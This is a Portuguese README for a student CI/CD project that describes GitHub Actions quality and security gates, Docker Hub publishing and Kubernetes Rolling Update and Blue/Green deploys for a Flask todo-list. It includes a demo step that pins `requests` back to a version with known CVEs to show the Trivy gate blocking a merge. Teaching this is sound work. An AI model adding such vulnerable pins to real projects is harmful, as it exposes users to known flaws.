  # CI/CD — Grupo WJD

Pipeline de **Integração Contínua e Entrega Contínua (CI/CD)** em GitHub Actions,
desenvolvido nas Atividades 1 e 2 da disciplina de **Pipelines de Entrega Contínua
(CI/CD) e Automação de Deployments**, da especialização em DevOps da CESAR School.

A aplicação é uma todo-list em Flask + SQLite que veio pronta no starter-kit. O
objeto de estudo é o **pipeline**, não a aplicação.

> Todos os comandos deste documento rodam a partir da raiz do repositório.
> Este README começa pelo manual de operações — como ver a entrega funcionando —
> e só depois explica as decisões.

  [![CI](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml/badge.svg)](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml)
  ![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white)
  ![Python](https://img.shields.io/badge/Python-3.10_|_3.11_|_3.12-3776AB?style=flat-square&logo=python&logoColor=white)
  ![Flask](https://img.shields.io/badge/Flask-000000?style=flat-square&logo=flask&logoColor=white)
  ![Trivy](https://img.shields.io/badge/Trivy-1904DA?style=flat-square&logo=aquasecurity&logoColor=white)
  ![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

  Badge verde indica `main` saudável; vermelho indica `main` quebrada — e
  consertá-la passa a ter prioridade sobre qualquer funcionalidade nova.

  ---

  ### Sumário

- [A entrega em um minuto](#a-entrega-em-um-minuto)
- [Membros](#membros)
- [O que o pipeline faz](#o-que-o-pipeline-faz)
  - [CD — Entrega contínua](#cd--entrega-contínua)
  - [`cd.yml` — Rolling Update](#cd.yml--rolling-update)
  - [Blue/Green](#bluegreen)
  - [O grafo de jobs](#o-grafo-de-jobs)
  - [O que acontece dentro de cada job da matrix](#o-que-acontece-dentro-de-cada-job-da-matrix)
  - [Os gates](#os-gates)
- [Da aplicação à imagem no Docker Hub](#da-aplicação-à-imagem-no-docker-hub)
  - [Dockerfile](#dockerfile)
  - [Build da imagem](#build-da-imagem)
  - [Teste da imagem](#teste-da-imagem)
  - [Tag da imagem para o Docker Hub](#tag-da-imagem-para-o-docker-hub)
  - [Autenticação no Docker Hub](#autenticação-no-docker-hub)
  - [Push da imagem para o Docker Hub](#push-da-imagem-para-o-docker-hub)
  - [Validação da imagem publicada](#validação-da-imagem-publicada)
  - [Publicação da imagem pelo pipeline de CI](#publicação-da-imagem-pelo-pipeline-de-ci)
  - [Uso de Secrets no GitHub Actions](#uso-de-secrets-no-github-actions)
  - [Referência da imagem no Kubernetes](#referência-da-imagem-no-kubernetes)
  - [Relação entre CI e CD](#relação-entre-ci-e-cd)
  - [Preparação do ambiente de deployment](#preparação-do-ambiente-de-deployment)
  - [Configuração do Ingress](#configuração-do-ingress)
  - [Deploy da aplicação no Kubernetes](#deploy-da-aplicação-no-kubernetes)
  - [Deploy Contínuo (CD) – Rolling Update](#deploy-contínuo-cd--rolling-update)
  - [Rolling Update](#rolling-update)
  - [Rollback](#rollback)
  - [Início rápido](#início-rápido)
- [Evidências da entrega](#evidências-da-entrega)
- [Como o GitHub Actions funciona](#como-o-github-actions-funciona)
- [Pré-requisitos](#pré-requisitos)
- [Configuração no GitHub](#configuração-no-github)
  - [Branch protection](#branch-protection)
  - [Required status checks](#required-status-checks)
  - [Variables e secrets](#variables-e-secrets)
  - [Environment](#environment)
  - [CODEOWNERS](#codeowners)
- [Rodando localmente](#rodando-localmente)
  - [Os mesmos comandos do CI](#os-mesmos-comandos-do-ci)
  - [A aplicação](#a-aplicação)
- [Estrutura do repositório](#estrutura-do-repositório)
- [Arquivo por arquivo](#arquivo-por-arquivo)
- [Variáveis, inputs e secrets](#variáveis-inputs-e-secrets)
- [Verificação](#verificação)
- [Solução de problemas](#solução-de-problemas)
- [Decisões de arquitetura](#decisões-de-arquitetura)
  - [O que foi usado](#o-que-foi-usado)
  - [Por que assim](#por-que-assim)
- [Além do material de referência](#além-do-material-de-referência)
  - [No pipeline](#no-pipeline)
  - [Na notificação](#na-notificação)
  - [Na proteção do repositório](#na-proteção-do-repositório)
  - [No CD](#no-cd)
- [Divergências em relação ao enunciado](#divergências-em-relação-ao-enunciado)
- [Créditos](#créditos)

  ## A entrega em um minuto

  - **O que bloqueia o merge:** lint, testes em três versões do Python e dois scans
    de segurança, todos obrigatórios no ruleset da `main`.
  - **Como foi comprovado:** um PR com uma versão vulnerável do `requests` ficou
    vermelho, teve o merge bloqueado e voltou ao verde com a correção — ver
    [Evidências da entrega](#evidências-da-entrega).
  - **O que acompanha os gates:** alertas do Trivy anotados no próprio PR, cache de
    dependências, publicação da imagem no Docker Hub, notificação no Discord e
    deploy em staging com aprovação humana.
  - **O que vai além do material do professor:** ver
    [Além do material de referência](#além-do-material-de-referência).
  - **Onde divergimos do enunciado, e por quê:** ver
    [Divergências](#divergências-em-relação-ao-enunciado).
  - No CD, a imagem publicada é implantada em um cluster Kubernetes. O pipeline
  suporta **Rolling Update** e **Blue/Green**, com deploy do ambiente separado da
  troca de tráfego em produção.
- No Blue/Green, o rollback é realizado pela troca do tráfego de volta para a
  versão anterior, mantendo os dois ambientes disponíveis durante a operação.
- **Como o CD foi comprovado:** deploy das versões Blue e Green, validação dos
  dois ambientes, troca do tráfego de produção e rollback para a versão anterior
  foram executados no cluster Kubernetes — ver [Evidências da entrega](#evidências-da-entrega).

  ---

  ## Membros

  | Membro | GitHub | Frente principal |
  | --- | --- | --- |
  | Weynne Guimarães | [@weynne](https://github.com/weynne) | Dono do repositório: configuração, branch protection e pipeline de CI |
  | Diego Tavares | [@diegotavares16](https://github.com/diegotavares16) | Environment e notificações; code owner dos workflows |
  | Jéssica Camarco | [@jessicacamarco](https://github.com/jessicacamarco) | Gates de segurança e documentação; code owner dos manifestos |

  ---

  ## O que o pipeline faz

  O `ci.yml` é um conjunto de **portões de qualidade** (*quality gates*) que
  bloqueiam o merge quando o lint, os testes ou os scans de segurança falham — e,
  quando todos passam, constrói a imagem da aplicação e a publica no Docker Hub.

  ### CD — Entrega contínua

O CD utiliza a imagem publicada pelo CI e executa o deployment no cluster Kubernetes. No
Rolling Update, o novo Deployment é aplicado, o rollout é acompanhado até a conclusão e
a aplicação é validada por smoke test. No Blue/Green, o deployment da nova versão e a
troca do tráfego de produção são etapas separadas, permitindo validar o ambiente antes
da ativação. Caso necessário, o tráfego pode ser direcionado novamente para a versão
anterior sem reconstruir a imagem.

#### `cd.yml` — Rolling Update

O workflow `cd.yml` realiza o deploy da aplicação utilizando a estratégia padrão
de **Rolling Update** do Kubernetes.

O fluxo é:

1. Recebe a tag da imagem Docker por `workflow_dispatch`.
2. Conecta-se ao servidor EC2 via SSH.
3. Atualiza no manifesto Kubernetes a imagem que será utilizada.
4. Copia o manifesto para o servidor.
5. Executa `kubectl apply`.
6. Aguarda a conclusão do rollout com `kubectl rollout status`.
7. Executa um smoke test para verificar a aplicação após o deploy.

O pipeline não considera o deployment concluído apenas porque o manifesto foi aplicado.
Após o `kubectl apply`, ele aguarda o rollout do Deployment com `kubectl rollout status`.
Somente depois que o rollout é concluído o smoke test é executado pelo endpoint `/healthz`.
Assim, uma falha na atualização ou na disponibilidade da aplicação interrompe o fluxo antes
da validação final.

#### Blue/Green

Além do Rolling Update, o projeto possui uma estratégia **Blue/Green**, dividida
em dois workflows:

- `cd-blue-green.yml`: realiza o deploy da nova imagem no ambiente Blue ou
  Green escolhido, sem alterar o tráfego de produção.
- `cd-blue-green-switch.yml`: realiza a troca do tráfego de produção para o
  ambiente escolhido, após a validação do slot.

A separação entre deploy e switch de tráfego permite validar a nova versão antes de
colocá-la em produção. O ambiente que recebe a nova versão permanece fora do tráfego
principal durante essa validação. Somente após a validação o Service de produção é
alterado para apontar para a nova cor.

A troca de tráfego também pode ser identificada visualmente na interface da aplicação. Cada
slot utiliza um valor diferente de `APP_COLOR`, permitindo distinguir quando a produção está
apontando para o ambiente `blue` ou para o `green`. Assim, durante a demonstração do CD, é
possível confirmar a troca de tráfego tanto pelo endpoint de saúde quanto pela mudança visual
da aplicação após o switch.

  ### O grafo de jobs

  ```mermaid
  flowchart TD
      T(["pull_request para main<br>push na main<br>push de qualquer tag"])

      T --> L["Lint (ruff)"]
      T --> M

      subgraph M["test — matrix de 3 versões"]
          direction LR
          M1["Test<br>Python 3.10"]
          M2["Test<br>Python 3.11"]
          M3["Test<br>Python 3.12"]
      end

      L --> P["Build and push image<br>Docker Hub"]
      M --> P
      P --> D

      D{"push na main?"}
      D -->|sim| S["Deploy to staging<br>pausa até aprovação humana"]
      D -->|"não — pull request ou tag"| K["deploy-staging<br>skipped"]

      N["Notify pipeline result<br>if: always()"]
      S --> N
      K --> N
      L -.->|"se falhar"| N
      M -.->|"se falhar"| N

      N --> W(["webhook do Discord"])
  ```

  `Lint` e `test` rodam **em paralelo** — `needs:` é o que cria ordem no GitHub
  Actions, e só `push`, `deploy-staging` e `notify` declaram um. A imagem só é
  publicada depois que lint e testes passam. As setas pontilhadas são o caminho da
  falha: com `if: always()`, o `notify` roda mesmo quando o lint ou os
  testes reprovam, que é justamente quando o time precisa saber.

  ### O que acontece dentro de cada job da matrix

  Os três jobs da matrix são idênticos, exceto pela versão do Python. A lógica
  deles vive no reusable workflow, nesta ordem:

  ```mermaid
  flowchart LR
      A["checkout"] --> B["setup-python<br>versão vem do input"]
      B --> C["cache pip"]
      C --> E["install<br>requirements + dev"]
      E --> F["Trivy fs"]
      F --> G["upload SARIF<br>if: always()"]
      G --> H["pytest -v"]
      H --> I["pip-audit"]

      F -.->|"exit-code 1"| X(["job vermelho<br>merge bloqueado"])
      H -.->|"assert falhou"| X
      I -.->|"CVE encontrado"| X
  ```

  O Trivy vem **antes** do pytest de propósito: se a dependência já está
  comprometida, não faz sentido gastar minutos rodando a suíte. Quando ele reprova,
  o job já está vermelho e `pytest` e `pip-audit` ficam *skipped*. O upload do SARIF
  é a exceção: tem `if: always()` porque o step do Trivy sai com código 1 quando
  acha algo — sem isso, o relatório nunca chegaria ao code scanning exatamente
  quando há o que reportar.

  ### Os gates

  Os gates abaixo são obrigatórios para o merge na `main`. O pull request só pode ser
integrado quando todos os checks exigidos pelo ruleset estiverem concluídos com sucesso.
Eles cobrem qualidade do código, testes automatizados e verificações de segurança.

  | Gate | Ferramenta | O que pega | Bloqueia o merge? |
  | --- | --- | --- | --- |
  | Lint | `ruff check .` | Estilo, imports fora de ordem, padrões conhecidos de bug | Sim |
  | Testes | `pytest -v` | Regressão funcional, nas três versões do Python | Sim |
  | Dependências | `pip-audit -r requirements.txt` | CVE em biblioteca Python de produção, com correção disponível | Sim |
  | Filesystem | `trivy fs` com `exit-code: 1` | CVE `MEDIUM` ou acima em bibliotecas **e** em pacotes do SO base | Sim |

  ---

  ## Da aplicação à imagem no Docker Hub

Antes da implementação do CD, a imagem utilizada pelos manifestos
Kubernetes ainda não existia no Docker Hub. Por isso, uma das primeiras
etapas foi garantir que o pipeline de CI fosse capaz de construir e
publicar a imagem da aplicação.

O processo completo é:

**Código da aplicação**
→ **Dockerfile**
→ **Build da imagem Docker**
→ **Teste da imagem**
→ **Tag da imagem**
→ **Docker Hub**
→ **Imagem disponível para o Kubernetes**

### Dockerfile

A construção da imagem é definida pelo arquivo:

```text
Dockerfile
```

O `Dockerfile` contém as instruções necessárias para criar a imagem da
aplicação.

A partir dele, o Docker reproduz o ambiente necessário para executar a
aplicação, incluindo a imagem base, as dependências e os arquivos
necessários para seu funcionamento.

### Build da imagem

A imagem pode ser construída a partir da raiz do projeto com:

```bash
docker build -t app-k8s-todolist:latest .
```

Nesse comando:

- `docker build` solicita ao Docker a construção da imagem;
- `-t` define o nome e a tag da imagem;
- `app-k8s-todolist` é o nome da imagem;
- `latest` é a tag utilizada;
- `.` indica que o diretório atual será utilizado como contexto do build.

Após a construção, a imagem pode ser verificada com:

```bash
docker images
```

A imagem deverá aparecer com o nome:

```text
app-k8s-todolist
```

e a tag:

```text
latest
```

### Teste da imagem

Antes de publicar a imagem, é possível executar um container localmente
para verificar se a aplicação inicia corretamente:

```bash
docker run -d --name todolist -p 5000:5000 app-k8s-todolist:latest
```

Verificar se o container está em execução:

```bash
docker ps
```

Testar o endpoint de saúde da aplicação:

```bash
curl -i http://localhost:5000/healthz
```

O endpoint `/healthz` deve retornar HTTP `200` quando a aplicação estiver
funcionando corretamente.

Após o teste, o container pode ser removido:

```bash
docker stop todolist
docker rm todolist
```

### Tag da imagem para o Docker Hub

Para publicar a imagem no Docker Hub, ela precisa ser identificada com o
nome do repositório remoto.

O usuário do Docker Hub **não deve ser gravado diretamente no workflow ou
no código do projeto**.

Para uma publicação manual, utiliza-se um placeholder na documentação:

```bash
docker tag app-k8s-todolist:latest <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
```

A estrutura da imagem será:

```text
<USUARIO_DOCKERHUB>/app-k8s-todolist:<TAG>
```

Por exemplo, utilizando a tag `latest`:

```text
<USUARIO_DOCKERHUB>/app-k8s-todolist:latest
```

### Autenticação no Docker Hub

Para publicar a imagem, é necessário autenticar o Docker no Docker Hub:

```bash
docker login
```

O acesso pode ser realizado utilizando um Docker Hub Access Token.

Após uma autenticação bem-sucedida, o Docker apresenta:

```text
Login Succeeded
```

> **Importante:** o Access Token não deve ser armazenado no código do
> projeto ou no README.

### Push da imagem para o Docker Hub

Depois de realizar o login e associar a imagem ao repositório remoto,
a publicação é feita com:

```bash
docker push <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
```

O Docker envia as camadas da imagem para o repositório informado.

Depois do `push`, a imagem passa a estar disponível no Docker Hub com a
tag utilizada.

### Validação da imagem publicada

A disponibilidade da imagem pode ser validada a partir de outra máquina,
como a EC2 que executará o cluster Kubernetes:

```bash
docker pull <USUARIO_DOCKERHUB>/app-k8s-todolist:latest
```

Se o download for concluído com sucesso, a imagem está disponível para
ser utilizada pelo Kubernetes.

Também é possível verificar a imagem localmente:

```bash
docker images
```

### Publicação da imagem pelo pipeline de CI

Depois da validação do processo de construção e publicação, essa etapa
passou a fazer parte do pipeline de CI.

O workflow responsável pelo CI é:

```text
.github/workflows/ci.yml
```

O pipeline executa os gates de qualidade e segurança antes da publicação
da imagem.

O fluxo executado pelo CI é:

**Código**
→ **Lint**
→ **Testes**
→ **Segurança**
→ **Build da imagem Docker**
→ **Push para o Docker Hub**

Dessa forma, o CD não precisa construir a imagem novamente.

O CD utiliza uma imagem que já foi construída e publicada no Docker Hub,
identificada pela tag informada na execução do workflow.

A publicação da imagem ocorre somente após a conclusão bem-sucedida dos gates de
qualidade e segurança. Dessa forma, o Docker Hub recebe apenas imagens produzidas
por uma execução do CI que passou pelas verificações obrigatórias.

### Uso de Secrets no GitHub Actions

Para evitar que informações de configuração fiquem gravadas diretamente
no workflow, o usuário do Docker Hub utilizado pelo CD é armazenado como
um GitHub Secret.

O secret utilizado pelo projeto é:

```text
DOCKERHUB_USERNAME_JESSICA
```

O workflow utiliza esse secret para montar o nome completo da imagem:

```yaml
IMAGE: ${{ secrets.DOCKERHUB_USERNAME_JESSICA }}/${{ env.IMAGE_NAME }}:${{ inputs.image_tag }}
```

A estrutura resultante é:

```text
<USUARIO_DOCKERHUB>/<NOME_DA_IMAGEM>:<TAG>
```

Nesse processo:

- `DOCKERHUB_USERNAME_JESSICA` fornece o usuário do Docker Hub;
- `IMAGE_NAME` define o nome da imagem;
- `inputs.image_tag` define a versão da imagem utilizada no deployment.

Assim, o usuário do Docker Hub não fica exposto diretamente no código do
workflow.

Os valores dos secrets não são armazenados no repositório nem aparecem nos arquivos
de workflow. O GitHub Actions injeta esses valores em tempo de execução, mantendo
credenciais e tokens fora do código versionado.

### Referência da imagem no Kubernetes

O manifesto Kubernetes utiliza um placeholder para a imagem:

```yaml
image: SEU_USUARIO_DOCKERHUB/app-k8s-todolist:latest
```

Durante a execução do CD, o workflow substitui o placeholder pela imagem
formada com o usuário armazenado no GitHub Secret e pela tag informada no
`workflow_dispatch`.

Dessa forma, o manifesto pode permanecer versionado no repositório sem
precisar armazenar diretamente o usuário utilizado pelo pipeline.

### Relação entre CI e CD

O CI é responsável por validar a aplicação e, após a aprovação dos gates, construir e
publicar a imagem Docker no Docker Hub. O CD utiliza essa imagem publicada como artefato
de entrada para realizar o deployment no cluster Kubernetes.

Assim, o fluxo completo é:

**Código → CI → gates → imagem Docker → CD → Kubernetes → validação → produção**

No Rolling Update, o CD atualiza o Deployment existente. No Blue/Green, o CD publica a
nova versão em um dos ambientes e a troca de tráfego ocorre em uma etapa separada.

> **Nota sobre o primeiro deployment:** durante a preparação inicial do
> ambiente, foi necessário garantir que a imagem `app-k8s-todolist` já
> estivesse disponível no Docker Hub antes da execução do deployment no
> cluster Kubernetes. Depois dessa etapa inicial, o pipeline de CI passou
> a realizar o fluxo de build e publicação da imagem.

### Preparação do ambiente de deployment

O deployment utiliza uma instância **EC2** como ambiente de execução do
cluster Kubernetes. Nela foram configurados **Docker, kind e kubectl**,
além do cluster Kubernetes utilizado pelo projeto.

A validação do ambiente foi realizada com:

```bash
docker --version
kind version
kubectl version --client
kind get clusters
kubectl get nodes
```

O cluster utilizado no laboratório é o `devops-labs`, e o nó deve estar
com status `Ready`:

```bash
kubectl get nodes
```

A comunicação com o cluster foi validada com:

```bash
kubectl cluster-info
```

A partir desse ambiente, o GitHub Actions consegue acessar a EC2 por SSH
e executar os comandos `kubectl` necessários para realizar os deployments.

O acesso SSH utilizado pelo pipeline é baseado em uma chave privada
armazenada como secret no GitHub, enquanto a chave pública é autorizada
na EC2.

A estrutura utilizada no deployment é:

```text
GitHub Actions
      │
      │ SSH
      ▼
     EC2
      │
      ▼
  Cluster kind
      │
      ├── namespace todolist
      │
      └── namespace todolist-bg
```

### Configuração do Ingress

Para permitir o acesso à aplicação, foi utilizado o **NGINX Ingress Controller** no cluster Kubernetes.

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml

kubectl get pods -n ingress-nginx

kubectl get ingress -n todolist

curl -i -H "Host: todolist.local" http://localhost/healthz
```

O fluxo de acesso ficou:

```text
Cliente → NGINX Ingress Controller → Ingress → Service → Pod → Aplicação
```

Para o acesso local, foi configurado o domínio `todolist.local` no arquivo `/etc/hosts`:

```text
<PUBLIC_IP> todolist.local
```

### Deploy da aplicação no Kubernetes

A aplicação foi publicada no cluster Kubernetes utilizando o manifesto `k8s/todolist.yaml`.

Para permitir o acesso à imagem privada do Docker Hub, foi configurado um secret de autenticação no namespace `todolist`.

```bash
kubectl create secret docker-registry dockerhub-secret \
  --docker-server=https://index.docker.io/v1/ \
  --docker-username=<USUARIO_DOCKERHUB_JESSICA> \
  --docker-password='<TOKEN_DOCKERHUB>' \
  -n todolist

kubectl apply -f k8s/todolist.yaml

kubectl get pods -n todolist

kubectl get svc -n todolist

kubectl get deployment -n todolist
```

A imagem utilizada no projeto segue o padrão:

```text
<USUARIO_DOCKERHUB_JESSICA>/app-k8s-todolist:latest
```

O manifesto utiliza o `imagePullSecrets` para que o Kubernetes consiga realizar o pull da imagem privada do Docker Hub.

O `Service` da aplicação é do tipo `ClusterIP`. Ele fornece o endpoint interno para
os Pods e é utilizado pelo Ingress para encaminhar as requisições recebidas pelo
hostname configurado.

O `Deployment` também utiliza `readinessProbe` e `livenessProbe`, ambas baseadas no endpoint
`/healthz`. A `readinessProbe` determina quando o Pod está pronto para receber tráfego,
enquanto a `livenessProbe` permite que o Kubernetes reinicie o container caso a aplicação
deixe de responder. No CD, o `kubectl rollout status` aguarda os Pods ficarem `Ready` antes
de considerar o rollout concluído, e o smoke test em `/healthz` valida o caminho completo
pelo Ingress até a aplicação.

As credenciais reais do Docker Hub não são armazenadas no repositório.

Após o deploy, a aplicação foi validada pelo endpoint de health check:

```bash
curl -i -H "Host: todolist.local" http://localhost/healthz
```

O retorno HTTP `200 OK` confirmou o funcionamento da aplicação.

  ### Deploy Contínuo (CD) – Rolling Update

O processo de CD foi configurado no workflow `.github/workflows/cd.yml` e utiliza uma imagem já disponível no Docker Hub.

O workflow recebe a versão da imagem por meio do parâmetro `image_tag`, configura o acesso à EC2, atualiza o manifesto Kubernetes e realiza o deploy no namespace `todolist`.

Principais etapas:

```text
GitHub Actions → EC2 → kind/Kubernetes → Deployment → Service → Ingress → Aplicação
```

Execução manual do workflow:

```bash
gh workflow run cd.yml -f image_tag=latest
```

Acompanhamento do deploy:

```bash
kubectl rollout status deployment/todolist -n todolist
kubectl get pods -n todolist
```

Após a atualização, foi realizado um smoke test no endpoint `/healthz`:

```bash
curl -i -H "Host: todolist.local" http://localhost/healthz
```

O Deployment utiliza a estratégia padrão `RollingUpdate`, permitindo a atualização gradual dos Pods sem interromper completamente a aplicação.

 ### Rolling Update

O workflow `.github/workflows/cd.yml` realiza o deployment da aplicação no namespace `todolist`, utilizando a estratégia padrão `RollingUpdate` do Kubernetes.

O workflow recebe a tag da imagem Docker por meio do parâmetro `image_tag` e realiza:

- configuração do acesso SSH à EC2;
- atualização da imagem no manifesto Kubernetes;
- aplicação do manifesto no cluster;
- acompanhamento do rollout;
- smoke test no endpoint `/healthz`.

Para executar o workflow:

**GitHub → Actions → Rolling deployment → Run workflow**

Informe a tag desejada da imagem, por exemplo:

```text
latest
```

Também é possível executar pela CLI:

```bash
gh workflow run cd.yml -f image_tag=latest
```

Validação do rollout:

```bash
kubectl rollout status deployment/todolist -n todolist
kubectl get pods -n todolist
```

### Blue/Green

Foi implementada uma estratégia de **Blue/Green Deployment**, mantendo dois ambientes independentes da aplicação no namespace `todolist-bg`:

```text
todolist-blue
todolist-green
```

Cada ambiente possui seu próprio Deployment e Service. O Service `todolist` é utilizado para direcionar o tráfego de produção para o ambiente ativo.

Os acessos utilizados para validação são:

```text
blue.todolist-bg.local
green.todolist-bg.local
todolist-bg.local
```

O processo é realizado em duas etapas:

1. realizar o deploy da nova versão em um dos ambientes;
2. validar o ambiente e realizar o switch do tráfego de produção.

Para realizar o deploy:

```bash
gh workflow run cd-blue-green.yml -f color=green -f image_tag=latest
```

Para alterar o ambiente de produção:

```bash
gh workflow run cd-blue-green-switch.yml -f color=green
```

Após a troca, o ambiente selecionado passa a receber o tráfego de produção, enquanto o outro permanece disponível para rollback.

A estratégia permite validar a nova versão antes da troca do tráfego e realizar o retorno ao ambiente anterior caso necessário.

### Rollback

O rollback permite retornar a aplicação para uma versão anterior caso seja identificado algum problema após o deployment.

No ambiente de **Rolling Update**, o rollback pode ser realizado utilizando:

```bash
kubectl rollout undo deployment/todolist -n todolist
```

No ambiente **Blue/Green**, o rollback é realizado direcionando novamente o Service de produção para o ambiente anterior.

Exemplo, retornando para o ambiente `blue`:

```bash
gh workflow run cd-blue-green-switch.yml -f color=blue
```

Após o rollback, a aplicação pode ser validada pelo endpoint:

```bash
curl -i -H "Host: todolist.local" http://localhost/healthz
```

No Blue/Green, a versão anterior permanece disponível durante o processo, permitindo a retomada do tráfego sem necessidade de reconstruir a imagem.

  ### Início rápido 

  Como ver o pipeline em ação, do jeito que ele funciona no dia a dia. Nada aqui
  precisa ser instalado na sua máquina: quem executa é o runner do GitHub.

  ### 1. Abrir um pull request e ver o gate agir

  ```bash
  git checkout main && git pull
  git checkout -b feat/minha-mudanca
  # ... edite os arquivos e faça commit ...
  git push -u origin feat/minha-mudanca
  ```

  Abra o PR pela interface do GitHub. O workflow dispara imediatamente, e a aba
  **Checks** do PR mostra o status ao vivo. O botão de merge só libera quando os
  cinco checks obrigatórios ficam verdes **e** um code owner que não seja o autor
  aprova o PR.

  ### 2. Reproduzir a demonstração de shift-left

  O `requirements.txt` da `main` não tem vulnerabilidades conhecidas. A falha é
  introduzida de propósito, para ver o gate reprovar antes do merge.

  ```bash
  git checkout main && git pull
  git checkout -b fix/requests-cve
  sed -i 's/requests==2.33.0/requests==2.31.0/' requirements.txt
  git commit -am "chore: demonstrate the shift-left security gate"
  git push -u origin fix/requests-cve
  ```

  Abra o PR. O `Lint` segue **verde** — o código não mudou — e os três jobs de
  teste ficam **vermelhos**: o Trivy encontra três CVEs `MEDIUM` no `requests` e
  encerra o job com código 1, antes do `pytest`. Os alertas aparecem anotados na
  linha alterada do `requirements.txt`, o merge fica **bloqueado** e uma
  notificação vermelha chega no Discord.

  Para corrigir, na **mesma branch**:

  ```bash
  sed -i 's/requests==2.31.0/requests==2.33.0/' requirements.txt
  git commit -am "fix(deps): bump requests to 2.33.0 to clear the CVEs"
  git push
  ```

  Os três checks voltam ao verde e os alertas passam a aparecer como *Fixed*; o
  merge passa a depender só da revisão de um code owner. O problema foi pego no PR, antes do merge,
  sem ninguém rodar a aplicação.

  > [!IMPORTANT]
  > Subir só para `2.32.x` **não** corrige os três CVEs. Os alertas do Trivy — e o
  > `pip-audit`, rodado sobre o mesmo arquivo — apontam três versões de correção
  > diferentes: 2.32.0, 2.32.4 e 2.33.0. Nem sempre "atualizar um pouco" basta.

  ### 3. Aprovar o deploy em staging

  Logo após um merge na `main`, o job `Deploy to staging (dummy)` aparece como
  **Waiting**. Vá em **Actions → o run → Review deployments → Approve and deploy**.
  Quem aprova precisa ser um revisor do environment diferente de quem clicou em
  *Merge* — ver [Environment](#environment).

  O job não faz deploy de verdade: o que se demonstra é o gate de aprovação
  humana, e cada aprovação fica registrada no histórico de deployments do
  repositório.

#### 4. Reproduzir o deploy e o rollback no Kubernetes

O CD recebe como input a tag de uma imagem que já foi publicada pelo CI no Docker Hub.
A imagem pode ser identificada pela tag curta do commit, permitindo implantar exatamente
a versão produzida por uma execução específica do CI, sem reconstruir a imagem durante o CD.

No Rolling Update, informe a tag do commit publicada pelo CI:

    gh workflow run cd.yml -f image_tag=<SHA_CURTO_DO_COMMIT>

Para acompanhar o rollout no cluster:

    kubectl rollout status deployment/todolist -n todolist

No Blue/Green, o deploy também recebe a tag da imagem publicada:

    gh workflow run cd-blue-green.yml -f color=green -f image_tag=<SHA_CURTO_DO_COMMIT>

A validação do slot ocorre antes da troca de tráfego. Depois, o switch direciona a produção
para o ambiente escolhido:

    gh workflow run cd-blue-green-switch.yml -f color=green

Após a validação, o rollback pode ser demonstrado retornando o tráfego para `blue`:

    gh workflow run cd-blue-green-switch.yml -f color=blue

A validação da aplicação é feita pelo endpoint `/healthz`.

  ## Evidências da entrega

| # | Evidência | Onde |
| --- | --- | --- |
| 1 | Pipeline completo verde na `main` | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [captura](evidencias/evidencia_07_pipeline_verde_main.png) |
| 2 | PR com merge **bloqueado** por gate vermelho | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [caixa de merge](evidencias/evidencia_12_merge_bloqueado.png) · [step do Trivy](evidencias/evidencia_14_trivy_bloqueio.png) · [pip-audit](evidencias/evidencia_13_pip_audit_cves.txt) |
| 3 | O mesmo PR corrigido, com os checks verdes | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [captura](evidencias/evidencia_11_pr_corrigido_verde.png) |
| 4 | Três jobs da matrix em paralelo + cache hit no segundo run | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [matrix](evidencias/evidencia_02_matrix_paralela.png) · [run #4](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34731638025) · [cache](evidencias/evidencia_09_cache_hit.png) |
| 5 | `Deploy to staging` aguardando aprovação humana | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [aguardando](evidencias/evidencia_05_deploy_waiting.png) · [aprovado](evidencias/evidencia_06_deploy_aprovado.png) |
| 6 | Relatório do Trivy no code scanning | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [captura](evidencias/evidencia_03_trivy_security.png) |
| 7 | Notificação de sucesso e de falha no canal do Discord | [sucesso](evidencias/evidencia_04_discord_sucesso.png) · [falha e recuperação](evidencias/evidencia_15_discord_falha.png) |
| 8 | Deploy do ambiente **Blue** no cluster Kubernetes | [evidência](evidencias/02-blue-green-pagina-web-blue.png) |
| 9 | Deploy do ambiente **Green** no cluster Kubernetes | [evidência](evidencias/02-blue-green-pagina-web-green.png) |
| 10 | Troca do tráfego de produção para o ambiente **Green** | [evidência](evidencias/03-blue-green-switch-producao.png) |
| 11 | **Rollback** do tráfego de produção para o ambiente **Blue** | [evidência](evidencias/04-blue-green-rollback-producao.png) |

  ---

  ## Como o GitHub Actions funciona

  Quatro níveis, de fora para dentro:

  | Nível | O que é | Aqui |
  | --- | --- | --- |
  | **Workflow** | Arquivo YAML em `.github/workflows/`, disparado por eventos | `ci.yml`, `_reusable-test.yml` |
  | **Job** | Grupo de steps que roda numa VM efêmera (*runner*) | `lint`, `test`, `push`, `deploy-staging`, `notify` |
  | **Step** | Um comando de shell ou uma chamada de Action | `ruff check .`, `pytest -v` |
  | **Action** | Código reutilizável, de terceiros ou próprio | `actions/checkout`, `aquasecurity/trivy-action` |

  Por padrão **jobs rodam em paralelo**; `needs:` é o que cria ordem entre eles. É
  daí que sai o formato deste pipeline: `lint` e `test` em paralelo, `push` com
  `needs: [lint, test]`, `deploy-staging` com `needs: [lint, test, push]` e
  `notify` com `needs:` nos quatro.

  Cada job roda numa VM nova, isolada, destruída ao fim. Nada persiste entre jobs
  além do que for explicitamente armazenado em cache ou publicado como artefato — por isso o
  cache de pip existe, e por isso cada job precisa do seu próprio `checkout`.

  Usamos apenas **runners hospedados** pelo GitHub (`ubuntu-latest`). Runner
  self-hosted não é necessário aqui e traria manutenção e superfície de ataque sem
  benefício.

  ---

  ## Pré-requisitos

O pipeline de CI roda nos runners hospedados do GitHub e não exige ferramentas instaladas
na máquina para sua execução. Para reproduzir localmente os gates ou executar/validar o
deployment, são necessários os requisitos abaixo.

  | Requisito | Para quê |
  | --- | --- |
